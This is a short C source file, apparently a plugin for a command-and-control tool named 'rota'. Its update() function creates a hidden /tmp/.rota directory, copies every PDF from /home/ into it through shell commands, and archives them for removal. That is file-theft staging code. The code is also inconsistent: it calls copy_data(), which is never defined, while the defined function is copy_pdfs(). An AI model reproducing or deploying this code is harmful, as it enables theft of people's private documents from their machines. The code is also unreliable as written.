#include <stdio.h>
#include <stdlib.h>

// this is loaded via dlsym.
// the argument to the rota_c2_run_plugin_1 command
extern void update(void) {
    create_dir();
    copy_data();
    stage_data();
}

void create_dir() {
    system("mkdir -p /tmp/.rota;");
}

void copy_pdfs() {
    system("find /home/ -name \"*.pdf\" -exec cp {} /tmp/.rota/ \;");
}

void stage_data() {
    system("cd /tmp/.rota; tar -czvf rota.tar.gz *");
}
